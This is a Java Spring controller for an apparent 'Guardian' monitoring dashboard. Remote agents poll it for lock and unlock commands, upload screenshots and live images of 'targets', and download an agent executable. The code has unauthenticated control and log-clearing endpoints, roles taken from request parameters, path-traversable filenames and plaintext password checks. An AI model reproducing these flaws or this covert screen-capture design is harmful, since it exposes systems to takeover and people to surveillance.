package com.guardian.controller;

import com.guardian.entity.User;
import com.guardian.repository.UserRepository;
import com.guardian.service.SecurityService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import java.util.Optional;
import java.util.List;
import java.util.ArrayList;
import java.util.Map;
import java.util.HashMap;
import java.util.Collections;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import org.springframework.web.multipart.MultipartFile;
import com.guardian.repository.LogRepository;
import com.guardian.entity.LogEntry;

@Controller
public class DashboardController {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private SecurityService securityService;

    @Autowired
    private LogRepository logRepository;

    // Target-Specific Command Queues for Agent Polling
    private static final java.util.concurrent.ConcurrentHashMap<String, ConcurrentLinkedQueue<String>> targetCommandQueues = new java.util.concurrent.ConcurrentHashMap<>();
    private static final String UPLOAD_DIR = "screenshots/";

    static {
        java.io.File dir = new java.io.File(UPLOAD_DIR);
        if (!dir.exists()) dir.mkdirs();
    }

    @GetMapping("/dashboard")
    public String showDashboard(
            @RequestParam(required = false) String apiKey, 
            @RequestParam(required = false, defaultValue = "ALL") String targetId, 
            @RequestParam(required = false, defaultValue = "ADMIN") String role,
            Model model) {
        if (apiKey == null || apiKey.isEmpty()) {
            return "POLICE".equalsIgnoreCase(role) ? "redirect:/police/login" : "redirect:/login";
        }

        Optional<User> user = userRepository.findAll().stream()
                .filter(u -> u.getApiKey().equals(apiKey))
                .findFirst();

        if (user.isEmpty()) {
            return "POLICE".equalsIgnoreCase(role) ? "redirect:/police/login" : "redirect:/login";
        }

        model.addAttribute("user", user.get());
        model.addAttribute("role", role.toUpperCase());
        
        List<LogEntry> logs = securityService.getLogsByTargetId(targetId);
        model.addAttribute("logs", logs);
        model.addAttribute("targets", securityService.getAllTargetIds());
        model.addAttribute("currentTarget", targetId);
        
        // Police dashboard metrics
        List<User> allUsers = userRepository.findAll();
        model.addAttribute("users", allUsers);
        model.addAttribute("totalBreaches", logs.size());
        model.addAttribute("activeUsers", allUsers.size());
        
        long criticalAlerts = logs.stream()
                .filter(log -> log.getDetails().toLowerCase().contains("kockroach") || 
                               log.getDetails().toLowerCase().contains("spying"))
                .count();
        model.addAttribute("criticalAlerts", criticalAlerts);
        
        // List screenshots based on targetId
        java.io.File folder = new java.io.File(UPLOAD_DIR + ("ALL".equals(targetId) ? "" : targetId + "/"));
        if (!folder.exists()) folder.mkdirs();
        
        String[] files = folder.list((dir, name) -> {
            String n = name.toLowerCase();
            return n.endsWith(".jpg") || n.endsWith(".png") || n.endsWith(".mp4");
        });
        model.addAttribute("screenshots", files != null ? files : new String[0]);
        
        return "dashboard";
    }

    @GetMapping("/funny-stuff")
    public String showDecoy() {
        return "decoy";
    }

    @PostMapping("/save-telegram")
    public String saveTelegram(
            @RequestParam String apiKey, 
            @RequestParam String botToken, 
            @RequestParam String chatId,
            @RequestParam(required = false, defaultValue = "ADMIN") String role) {
        if ("POLICE".equalsIgnoreCase(role)) {
            return "redirect:/dashboard?apiKey=" + apiKey + "&role=POLICE&error=unauthorized";
        }

        Optional<User> user = userRepository.findAll().stream()
                .filter(u -> u.getApiKey().equals(apiKey))
                .findFirst();

        if (user.isPresent()) {
            User u = user.get();
            u.setTelegramBotToken(botToken);
            u.setTelegramChatId(chatId);
            userRepository.save(u);
            return "redirect:/dashboard?apiKey=" + apiKey + "&role=" + role + "&success";
        }
        return "redirect:/login";
    }

    @GetMapping("/api/status")
    @ResponseBody
    @CrossOrigin
    public java.util.Map<String, Object> getStatus() {
        java.util.Map<String, Object> status = new java.util.HashMap<>();
        status.put("locked", com.guardian.Main.isLocked());
        status.put("kavachActive", securityService.isKavachActive());
        return status;
    }

    @PostMapping("/api/kavach/toggle")
    @ResponseBody
    @CrossOrigin
    public String toggleKavach(@RequestParam boolean active, @RequestParam(required = false, defaultValue = "ADMIN") String role) {
        if ("POLICE".equalsIgnoreCase(role)) {
            return "KAVACH_UNAUTHORIZED";
        }
        securityService.setKavachActive(active);
        return "KAVACH_" + (active ? "ACTIVATED" : "DEACTIVATED");
    }

    @PostMapping("/api/control")
    @ResponseBody
    @CrossOrigin
    public String controlSystem(
            @RequestParam String action, 
            @RequestParam(required = false) String apiKey,
            @RequestParam(required = false, defaultValue = "ADMIN") String role,
            @RequestParam(required = false, defaultValue = "ALL") String targetId) {
        if ("POLICE".equalsIgnoreCase(role)) {
            return "ERROR: Unauthorized role";
        }

        String uppercaseAction = action.toUpperCase();
        if ("lock".equalsIgnoreCase(action)) {
            com.guardian.Main.setLockedRemote(true);
            uppercaseAction = "LOCK";
        } else if ("unlock".equalsIgnoreCase(action)) {
            com.guardian.Main.setLockedRemote(false);
            uppercaseAction = "UNLOCK";
        }

        // Push command to the specific target queue(s)
        if ("ALL".equalsIgnoreCase(targetId)) {
            for (String tid : targetCommandQueues.keySet()) {
                targetCommandQueues.computeIfAbsent(tid, k -> new ConcurrentLinkedQueue<>()).add(uppercaseAction);
            }
        } else {
            targetCommandQueues.computeIfAbsent(targetId, k -> new ConcurrentLinkedQueue<>()).add(uppercaseAction);
        }

        securityService.addLog("3rd AI Dashboard", uppercaseAction, "Remote command executed: " + action, null, targetId);

        return "OK";
    }

    @GetMapping("/api/commands/poll")
    @ResponseBody
    @CrossOrigin
    public Map<String, String> pollCommands(
            @RequestParam(required = false) String apiKey,
            @RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
        if (apiKey != null) {
            userRepository.findAll().stream()
                .filter(u -> u.getApiKey().equals(apiKey))
                .findFirst()
                .ifPresent(u -> {
                    u.setLastSeen(java.time.LocalDateTime.now());
                    userRepository.save(u);
                });
        }

        // Initialize target specific queue if not exists
        targetCommandQueues.putIfAbsent(targetId, new ConcurrentLinkedQueue<>());

        // Dynamic Self-Registration: if we haven't seen this target in logs, write an online event 
        // to immediately register it in the SQLite database and populate the dashboard dropdown
        if (!"UNKNOWN".equals(targetId)) {
            List<LogEntry> logs = securityService.getLogsByTargetId(targetId);
            if (logs.isEmpty()) {
                securityService.addLog("SYSTEM", "AGENT_ONLINE", "Agent connected from dynamic target: " + targetId, null, targetId);
            }
        }

        ConcurrentLinkedQueue<String> queue = targetCommandQueues.get(targetId);
        String cmd = (queue != null) ? queue.poll() : null;
        
        Map<String, String> response = new HashMap<>();
        response.put("command", cmd != null ? cmd : "NONE");
        return response;
    }

    @PostMapping("/api/upload")
    @ResponseBody
    @CrossOrigin
    public String handleFileUpload(@RequestParam("file") MultipartFile file, @RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
        if (file.isEmpty()) return "FAIL";
        try {
            java.io.File dir = new java.io.File(UPLOAD_DIR + targetId + "/");
            if (!dir.exists()) dir.mkdirs();
            java.nio.file.Path path = Paths.get(dir.getAbsolutePath() + "/" + file.getOriginalFilename());
            Files.copy(file.getInputStream(), path, StandardCopyOption.REPLACE_EXISTING);
            return "SUCCESS";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    @PostMapping("/api/live-upload")
    @ResponseBody
    @CrossOrigin
    public String handleLiveUpload(@RequestParam("file") MultipartFile file, @RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
        try {
            java.io.File dir = new java.io.File(UPLOAD_DIR + targetId + "/");
            if (!dir.exists()) dir.mkdirs();
            java.nio.file.Path path = Paths.get(dir.getAbsolutePath() + "/live_now.jpg");
            Files.copy(file.getInputStream(), path, StandardCopyOption.REPLACE_EXISTING);
            return "SUCCESS";
        } catch (Exception e) { return "ERROR"; }
    }

    @GetMapping("/api/live-stream")
    @ResponseBody
    @CrossOrigin
    public org.springframework.http.ResponseEntity<?> getLiveStream(@RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
        String pathStr = UPLOAD_DIR + targetId + "/live_now.jpg";
        
        if ("ALL".equals(targetId) || "UNKNOWN".equals(targetId)) {
            java.io.File uploadDir = new java.io.File(UPLOAD_DIR);
            if (uploadDir.exists() && uploadDir.isDirectory()) {
                java.io.File[] dirs = uploadDir.listFiles(java.io.File::isDirectory);
                if (dirs != null && dirs.length > 0) {
                    for (java.io.File dir : dirs) {
                        java.io.File liveFile = new java.io.File(dir, "live_now.jpg");
                        if (liveFile.exists()) {
                            pathStr = liveFile.getAbsolutePath();
                            break;
                        }
                    }
                }
            }
        }

        java.io.File checkFile = new java.io.File(pathStr);
        if (!checkFile.exists()) {
            // Return 204 No Content to indicate stream not active yet (prevents broken image box)
            return org.springframework.http.ResponseEntity.noContent().build();
        }

        org.springframework.core.io.Resource resource = new org.springframework.core.io.FileSystemResource(pathStr);
        return org.springframework.http.ResponseEntity.ok()
                .header(org.springframework.http.HttpHeaders.CACHE_CONTROL, "no-store, no-cache, must-revalidate, max-age=0")
                .header(org.springframework.http.HttpHeaders.PRAGMA, "no-cache")
                .contentType(org.springframework.http.MediaType.IMAGE_JPEG)
                .body(resource);
    }

    @PostMapping("/api/login")
    @ResponseBody
    @CrossOrigin
    public java.util.Map<String, Object> apiLogin(@RequestParam String email, @RequestParam String password) {
        java.util.Map<String, Object> response = new java.util.HashMap<>();
        Optional<User> user = userRepository.findAll().stream()
                .filter(u -> u.getEmail().equals(email) && u.getPassword().equals(password))
                .findFirst();
        
        if (user.isPresent()) {
            response.put("success", true);
            response.put("apiKey", user.get().getApiKey());
        } else {
            response.put("success", false);
            response.put("message", "Invalid Email or Password");
        }
        return response;
    }

    @GetMapping("/api/logs")
    @ResponseBody
    @CrossOrigin
    public java.util.List<com.guardian.entity.LogEntry> apiLogs() {
        return securityService.getAllLogs();
    }

    @PostMapping("/api/logs/clear")
    @ResponseBody
    @CrossOrigin
    public String clearLogs() {
        securityService.clearAllLogs();
        return "LOGS_CLEARED";
    }

    @GetMapping("/api/screenshots/{filename}")
    @ResponseBody
    @CrossOrigin
    public org.springframework.http.ResponseEntity<org.springframework.core.io.Resource> getScreenshot(@PathVariable String filename, @RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
        String path = "ALL".equals(targetId) || "UNKNOWN".equals(targetId) ? UPLOAD_DIR + filename : UPLOAD_DIR + targetId + "/" + filename;
        java.io.File file = new java.io.File(path);
        
        if (!file.exists() && ("ALL".equals(targetId) || "UNKNOWN".equals(targetId))) {
            // Search in subdirectories
            java.io.File uploadDir = new java.io.File(UPLOAD_DIR);
            if (uploadDir.exists() && uploadDir.isDirectory()) {
                java.io.File[] dirs = uploadDir.listFiles(java.io.File::isDirectory);
                if (dirs != null) {
                    for (java.io.File dir : dirs) {
                        java.io.File subFile = new java.io.File(dir, filename);
                        if (subFile.exists()) {
                            path = subFile.getAbsolutePath();
                            break;
                        }
                    }
                }
            }
        }
        
        org.springframework.core.io.Resource resource = new org.springframework.core.io.FileSystemResource(path);
        
        String contentType = "image/jpeg";
        if (filename.toLowerCase().endsWith(".png")) contentType = "image/png";
        else if (filename.toLowerCase().endsWith(".mp4")) contentType = "video/mp4";

        return org.springframework.http.ResponseEntity.ok()
                .contentType(org.springframework.http.MediaType.parseMediaType(contentType))
                .body(resource);
    }

    @GetMapping("/3rd-AI-Agent.exe")
    public org.springframework.http.ResponseEntity<org.springframework.core.io.Resource> downloadAgent() {
        org.springframework.core.io.Resource resource = new org.springframework.core.io.FileSystemResource("3rd-AI-Agent.exe");
        return org.springframework.http.ResponseEntity.ok()
                .header(org.springframework.http.HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"3rd-AI-Agent.exe\"")
                .contentType(org.springframework.http.MediaType.APPLICATION_OCTET_STREAM)
                .body(resource);
    }
}
